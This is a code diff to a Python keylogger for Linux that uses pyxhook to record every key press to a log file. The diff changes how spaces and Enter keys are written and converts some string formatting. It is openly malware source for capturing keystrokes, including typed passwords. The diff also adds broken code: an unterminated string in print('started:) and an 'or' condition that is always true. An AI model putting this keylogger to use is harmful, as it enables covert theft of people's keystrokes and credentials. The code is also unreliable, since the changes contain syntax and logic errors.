@@ -1,11 +1,11 @@
-#!/usr/bin/env python
+#!/usr/bin/env python 
 import os
 from argparse import ArgumentParser
 from datetime import datetime
 
-from keylogger import pyxhook
+import pyxhook
 
-
+print('started:)
 def main():
     ts = datetime.now().strftime("%d-%m-%Y_%H:%M:%S")
     parser = ArgumentParser(description='A simple keylogger for Linux.')
@@ -40,7 +40,13 @@ def main():
 
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-            f.write('{}\n'.format(event.Key))
+
+            if event.Key == 'space':
+                f.write(f' {event.Key} ')
+            elif event.Key == 'P_Enter' or 'Return' :
+                f.write(f'\n{event.Key}\n')
+            else:
+                f.write(f'{event.Key}')
 
         if event.Ascii == cancel_key:
             new_hook.cancel()
@@ -56,10 +62,10 @@ def main():
         pass
     except Exception as ex:
         # Write exceptions to the log file, for analysis later.
-        msg = 'Error while catching events:\n  {}'.format(ex)
+        msg = f'Error while catching events:\n  {ex}'
         pyxhook.print_err(msg)
         with open(log_file, 'a') as f:
-            f.write('\n{}'.format(msg))
+            f.write(f'\n{msg}')
 
 if __name__ == '__main__':
     main()
